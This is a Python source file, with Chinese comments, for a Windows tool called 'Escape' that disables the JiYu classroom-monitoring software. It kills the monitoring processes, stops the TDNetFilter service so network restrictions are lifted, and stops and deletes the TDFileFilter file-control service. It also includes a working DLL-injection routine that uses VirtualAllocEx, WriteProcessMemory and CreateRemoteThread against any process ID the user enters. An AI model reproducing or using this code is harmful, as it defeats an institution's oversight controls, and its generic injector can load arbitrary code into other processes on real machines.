# 此程序为Windows设计，在其它操作系统上会出现兼容性问题。

# 导入必要组件
import sys
import time
from os import system
import win32gui
import win32con
from pynput import keyboard
from ctypes import *
import signal

# 抄近路区
r = system

def c():
    r("cls")

def wait():
    time.sleep(3)

def signal_handler(signal,frame):

    print('\n\n[!] 你按下了Ctrl+C，正在退出程序...')
    time.sleep(1)
    c()
    sys.exit(0)

signal.signal(signal.SIGINT,signal_handler)

stage = "Pre-Alpha"
version = "0.1.0"

# 菜单
def menu():
    funcChoice = ""

    r("cls")
    r("title Escape >nul")
    time.sleep(0.5)

    if stage == "Release":
        workingStatus = "(Stable)"
    else:
        workingStatus = "(Work in progress)"

    nameStr = "Escape by kev1nweng"
    print(nameStr)
    print(stage, version, workingStatus)

    time.sleep(0.1)
    print("\n+菜单\n")
    print("0. #Test#")
    print("1. 立即结束极域教室主进程")
    print("2. 置顶操作")
    print("+ 2.1 置顶窗口")
    print("+ 2.2 取消置顶")
    print("3. 对进程注入DLL文件")
    print("4. 解除强制断网")


    while True:
        try:
            funcChoice = float(input("\n请输入你要执行的功能序号：\n>> "))
            break
        except ValueError:
            print("\n[!] 非法输入值。")
            time.sleep(3)
            menu()

    if funcChoice == 0:
        test()

    if funcChoice == 1:
        kill("StudentMain.exe")

    if funcChoice == 2.1:
        wT = ""
        wT = str(input("\n输入你要置顶的窗口名: "))
        pin(wT)
        print("[+] 执行完成。")
        wait()
        menu()

    if funcChoice == 2.2:
        wT = ""
        wT = str(input("\n输入你要取消置顶的窗口名: "))
        unpin(wT)
        print("[+] 执行完成。")
        wait()
        menu()

    if funcChoice == 3:
        print("")
        injectPID = int(input("输入待注入进程的PID: "))
        injectDLL = str(input("输入待注入进程的DLL完整路径: "))
        inject(injectPID, injectDLL)
        menu()

    if funcChoice == 4:
        r("taskkill /f /im GATESRV.exe >nul 2>nul")
        r("taskkill /f /im MasterHelper.exe >nul 2>nul")
        r("sc stop TDNetFilter >nul 2>nul")
        print("\n执行完成。极域网络滤网已被关闭。")
        wait()
        menu()

    if funcChoice == 5:
        r("sc stop TDFileFilter")
        r("sc delete TDFileFilter")
        print("\n执行完成。极域文件控制服务已被卸载。")

def test():
    input()


def kill(programName):
    try:
        command = "taskkill >nul /f /im " + programName + " 2>nul"
        r(command)
    except Exception:
        print("\n[!] 执行出现错误。请检查输入内容是否正确后重试。")
        wait()


def pin(windowTitle):
    try:
        hwnd = win32gui.FindWindow(None, windowTitle)    #获取所有窗口句柄 
        # hwnd = win32gui.FindWindow('xx.exe', None)
        win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
        # ctypes.windll.user32.ShowWindow(hwnd, 3)
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
        win32con.SWP_NOMOVE | win32con.SWP_NOACTIVATE | win32con.SWP_NOOWNERZORDER | win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE)
        # 取消置顶
        # win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
        if __name__ == '__main__':
            pass
    except Exception:
        print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")
        wait()
        menu()


def unpin(windowTitle):
    try:
        hwnd = win32gui.FindWindow(None, windowTitle)    #获取所有窗口句柄 
        # hwnd = win32gui.FindWindow('xx.exe', None)
        win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
        # ctypes.windll.user32.ShowWindow(hwnd, 3)
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
        win32con.SWP_NOMOVE | win32con.SWP_NOACTIVATE | win32con.SWP_NOOWNERZORDER | win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE)
        # 取消置顶
        win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
        if __name__ == '__main__':
            pass
    except Exception:
        print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")
        wait()
        menu()


def inject(pid, dll_path):
    print("")

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM = ( 0x1000 | 0x2000 )

    kernel32 = windll.kernel32
    dll_len = len(dll_path)

    # 获取句柄
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

    if not h_process:
        print ("[!] 无法获取此PID的句柄: %s" %(pid))
        print ("[!] 请确认PID: %s 有效。" %(pid))
        wait()
        menu()

    # 分配内存
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    # 注入DLL
    written = c_int(0)  
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

    # Resolve LoadLibraryA Address
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        print ("[!] 注入失败，正在退出...")
        wait()
        menu()

    print ("[+] 成功创建远程进程 0x%08x." %(thread_id.value))


menu()